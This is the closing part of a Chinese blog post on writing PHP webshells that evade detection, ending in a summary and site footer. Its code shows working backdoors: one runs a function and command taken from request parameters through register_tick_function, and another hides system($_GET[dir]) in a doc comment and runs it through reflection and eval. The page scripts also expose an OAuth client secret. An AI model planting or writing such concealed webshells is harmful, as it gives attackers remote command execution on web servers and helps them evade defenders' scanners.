+<h4 id="b-函数构造传参"><a href="#b-函数构造传参" class="headerlink" title="b.函数构造传参"></a>b.函数构造传参</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);<span class="comment">//解释器每执行1条可计时的低级语句就发生的事件</span></span><br><span class="line"><span class="comment">#register_tick_function ($f, $_REQUEST[&#x27;aabyss&#x27;]);</span></span><br><span class="line"><span class="title function_ invoke__">register_tick_function</span>(<span class="variable">$f</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;yly&#x27;</span>]);<span class="comment">//执行一次低级语法，就是第一个参数回调函数</span></span><br></pre></td></tr></table></figure>
+
+<p>每个tick中出现的事件，由register_tick_function指定</p>
+<p>这个相当于输入两个参数，第一个参数控制高危函数输入，第二个参数为命令</p>
+<p>tick函数介绍 <a target="_blank" rel="noopener" href="http://t.csdnimg.cn/q0p5p">http://t.csdnimg.cn/q0p5p</a></p>
+<h3 id="0x10-自定义函数拼接"><a href="#0x10-自定义函数拼接" class="headerlink" title="0x10 自定义函数拼接"></a>0x10 自定义函数拼接</h3><p>顾名思义，用自定义函数去拼接代码内容</p>
+<p>这个用到了的话，再写</p>
+<h3 id="0x11-读取字符串绕过"><a href="#0x11-读取字符串绕过" class="headerlink" title="0x11 读取字符串绕过"></a>0x11 读取字符串绕过</h3><p>通过读取的目的获得相应字符串</p>
+<h4 id="a-读取注释"><a href="#a-读取注释" class="headerlink" title="a.读取注释"></a>a.读取注释</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意，注释必须遵照一定格式，不能在同一行，否则无法读取</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*system($_GET[dir]);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>=<span class="number">123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>=<span class="number">456</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;User&#x27;</span>);</span><br><span class="line"><span class="comment">//echo $user.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//$user1=new User;</span></span><br><span class="line"><span class="comment">//echo $user1-&gt;c.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="variable">$comment</span> = <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">getDocComment</span>();<span class="comment">//取注释</span></span><br><span class="line"><span class="comment">//echo $comment.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$comment</span> ,<span class="number">19</span> ,<span class="number">3</span> );<span class="comment">//取注释里的命令</span></span><br><span class="line"><span class="comment">//echo $f;</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$f</span>);<span class="comment">//change func</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Class [ class User ] &#123; @@ E:\VS project\py\Debug\duqu1.php 3-9 - Constants [0] &#123; &#125; - Static properties [0] &#123; &#125; - Static methods [0] &#123; &#125; - Properties [2] &#123; Property [ private $a = 123 ] Property [ public $c = 456 ] &#125; - Methods [1] &#123; Method [ public method test ] &#123; @@ E:\VS project\py\Debug\duqu1.php 6 - 8 - Parameters [1] &#123; Parameter #0 [ $b ] &#125; &#125; &#125; &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">456*/</span></span><br></pre></td></tr></table></figure>
+
+<p>new ReflectionClass($class) 获得class的反射对象（包含了元数据信息），它类比于new $class()，这个不能访问私有对象，但反射可以</p>
+<h4 id="b-读取数据库"><a href="#b-读取数据库" class="headerlink" title="b.读取数据库"></a>b.读取数据库</h4><p>先写入数据库，再从该数据库读取内容提取相应字符</p>
+<h4 id="c-读取目录"><a href="#c-读取目录" class="headerlink" title="c.读取目录"></a>c.读取目录</h4><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来讲，无外乎高危函数的拆分、转换、编码、拼接</p>
+<p>各种绕过相互组合，灵活多变，绕过率成功更高</p>
+<p>php除了变量，其它均不区分大小写</p>
+<p>总之算是对webshell编写有更好的了解</p>
+<p>参考来源：<a target="_blank" rel="noopener" href="https://blog.zgsec.cn/">https://blog.zgsec.cn/</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/03/21/php-webshell/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/phpwebshell/" rel="tag">phpwebshell</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/04/22/nginx-conf/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            nginx配置
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/03/20/websocket/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">websocket</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
